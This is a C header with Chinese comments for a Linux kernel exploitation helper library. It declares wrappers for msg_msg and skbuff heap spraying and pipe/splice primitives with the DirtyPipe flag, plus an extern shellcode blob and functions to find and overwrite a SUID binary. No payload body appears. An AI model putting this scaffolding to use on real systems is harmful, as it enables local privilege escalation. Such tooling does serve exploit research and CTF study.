#define _GNU_SOURCE
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

/*
 * 给每个函数都加了报错判断
 * 如果全是小写的，test+libc原本的函数名，就是封装原本libc函数，用法相同
 * 如果test后函数名首字母大写，就是一些自己实现的漏洞利用会用到的函数
 * 非test开头那就直接就是自己实现的函数
 * 很多函数直接拷贝的 https://github.com/veritas501 exp 中的(确实好用)
 */
#ifndef O_WRONLY //在有些linux gcc 里include fcntl.h报错 
#define O_WRONLY 00000001
#endif

#ifndef O_RDONLY 
#define O_RDONLY 00000000
#endif

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#ifndef true
#define true 1
#endif

#ifndef false
#define false 0
#endif

#define likely(x) __builtin_expect(!!(x), 1) 
#define unlikely(x) __builtin_expect(!!(x), 0)

//log
#define logd(fmt, ...) dprintf(2, "[*] " fmt "\n", ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, "[+] " fmt "\n", ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, "[-] " fmt "\n", ##__VA_ARGS__)

#define die1(file, line, fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at file: %s, line: %d!", file, line); \
        if (sync_pipe[1])                  \
            write(sync_pipe[1], "F", 1);   \
        exit(-1);                           \
    } while (0)

//退出的时候会显示文件名和行号
#define die(fmt, ...) \
    die1(__FILE__, __LINE__, fmt, ##__VA_ARGS__)  

extern debug; 
//debuf == true 时才打印
#define debugLog(fmt, ...) \
    do { \
        if(debug) \
            logd(fmt, ##__VA_ARGS__); \
    } while(0)

//判断一个地址是否是内核地址
#define ifKernel(addr) \
    if ((addr & 0xffff000000000000) != 0xffff000000000000) \
        die("Not a kernel address!"); 
      
//输出无用数据的buff 用于不关注内容的接收数据操作
extern char myTmpBuffer[0x2000];
//msg队列
extern int * mm;
//msgmsg
typedef struct
{
        uint64_t mtype;
        char mtext[1];
}msg;

typedef struct
{
    uint64_t m_list_next;
    uint64_t m_list_prev;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
    char mtext[0];
}msg_msg;

typedef struct {
    uint64_t next;
}msg_msgseg;


int32_t mymsgget(key_t key, int msgflg, char * file, int32_t line);
int32_t mymsgsnd(int msqid, void *msgp, size_t msgsz, int msgflg, char * file, int32_t line);
ssize_t mymsgrcv(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg, char * file, int32_t line);
void myMsqInit(int * msqids, int nummsgs, char * file, int32_t line);
void myMSQInit(int nummsgs, char * file, int32_t line);
void setMsgHead(void* msg, uint64_t m_list_next, uint64_t m_list_prev, uint64_t m_type, uint64_t m_ts, uint64_t next, uint64_t security);

//根据想要布置在内存中的实际大小计算需要传递给msg的大小
#define MSG_TEXT_SIZE(x) (         \
    (x) - sizeof( msg_msg) - \
    sizeof( msg_msgseg) * (((x + PAGE_SIZE - 1) / PAGE_SIZE) - 1))

//封装msg 相关msgget msgsnd msgrcv 失败直接退出并打印当前行数
#define testmsgget(key, msgflg) \
    mymsgget(key, msgflg, __FILE__, __LINE__)

#define testmsgsnd(msqid, msgp, msgsz, msgflg) \
    mymsgsnd(msqid, msgp, msgsz, msgflg, __FILE__, __LINE__)

#define testmsgrcv(msqid, msgp, msgsz, msgtyp, msgflg) \
    mymsgrcv(msqid, msgp, msgsz, msgtyp, msgflg, __FILE__, __LINE__)

//自动初始化msg 队列msqids; 队列大小：nummsgs
#define testMsqInit(msqids, nummsgs) \
    myMsqInit(msqids, nummsgs, __FILE__, __LINE__)

#define msqInit(nummsgs) \
    myMSQInit(nummsgs, __FILE__, __LINE__)

//释放一个消息，失败退出，并不返回内容 
//msgid: 消息队列句柄; size: 消息大小; mtype: 消息类型
#define delMsg(msgid, size, mtype) \
    testmsgrcv(msgid, myTmpBuffer, size, mtype, IPC_NOWAIT)



//skbuff
//sk队列长度，sk句柄数量
extern int nSocks;
//每个sk队列中打算喷射多少个skbuff
extern int nSkBuffs;
//sk队列指针ss
extern int (*ss)[2];

int mysocket(int af, int type, int protocol, char * file, int32_t line);
void mysocketpair(int domain, int type, int protocol, int sv[2], char * file, int32_t line);
//void mySkfdInit(int ** sockfd, int nummsgs, char * file, int32_t line);
void mySkInit(int sockNum, int skbuffsPerSk, char * file, int32_t line);
void mySpraySkbuff(const void *buf, size_t size, char * file, int32_t line);
void myFreeSkbuff(size_t size, char * file, int32_t line);

//设置Socket 队列数量
#define SET_N_SOCKS(n) nSocks = n 
//设置每个队列中打算喷射多少个skbuff
#define SET_N_SKBUFFS(n) nSkBuffs = n

//封装基本函数socket socketpair 失败退出
#define testsocket(af, type, protocol) \
    mysocket(af, type, protocol, __FILE__, __LINE__)

#define testsocketpair(domain, type, protocol, sv) \
    mysocketpair(domain, type, protocol, sv, __FILE__, __LINE__)
/*
#define testSkfdInit(sockfd, nummsgs) \
    mySkfdInit(sockfd, nummsgs, __FILE__, __LINE__)*/

//初始化消息队列，输入消息队列数量和每个消息队列打算喷射多少个skbuff
#define skInit(sockNum, skbuffsPerSk) \
    mySkInit(sockNum, skbuffsPerSk, __FILE__, __LINE__)

//需ss sk队列完成初始化。向消息队列中喷射长size 的buf 内容
#define spraySkbuff(buf, size) \
    mySpraySkbuff(buf, size, __FILE__, __LINE__)

//清空ss sk队列 size 为队列中目前
#define freeSkbuff(size) \
    myFreeSkbuff(size, __FILE__, __LINE__)


//pipe
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

int mypipe(int fd[2], char * file, int32_t line);
ssize_t mysplice(int fd_in , void * off_in , int fd_out , void * off_out , size_t len , unsigned int flags, char * file, int32_t line);

//封装pipe splice 返回负数即退出
#define testpipe(fd) \
    mypipe(fd, __FILE__, __LINE__)

#define testsplice(fd_in, off_in, fd_out, off_out, len, flags) \
    mysplice(fd_in, off_in, fd_out, off_out, len, flags, __FILE__, __LINE__)



//thread sync
extern int sync_pipe[2];
void initSyncPipe();

//normal
//绑定到单一CPU
void bindCpu();
//需要unshare 的调用
void initUnshare();
//16进制打印data ，打印长度size
void hexdump(const void *data, size_t size);
//暂停
void debugPause();
int myopen(char *path,int flags, char * file, int32_t line);
ssize_t mywrite(int fd, const void *buf, size_t nbyte, char * file, int32_t line);
ssize_t myread(int fd, void *buf, size_t nbyte, char * file, int32_t line);

//封装了open write read 操作，返回负数就会退出，如果不想退出不要调用
#define testopen(path, flags) \
    myopen(path, flags, __FILE__, __LINE__)

#define testwrite(fd, buf, nbyte) \
    mywrite(fd, buf, nbyte, __FILE__, __LINE__)

#define testread(fd, buf, nbyte) \
    myread(fd, buf, nbyte, __FILE__, __LINE__)

//get suid file
#ifndef S_ISUID
#define S_ISUID 04000
#endif

//shellcode 长度
extern int shellElfLen;
//最后找到的目标suid 文件
extern char targetFile[0x50];
//shellcode
extern const char shellElf[];

//搜索符合条件的suid 文件并初始化shellcode
void getTargetFile();
//检查是否完成任意文件写
int ifAtkSuccess();

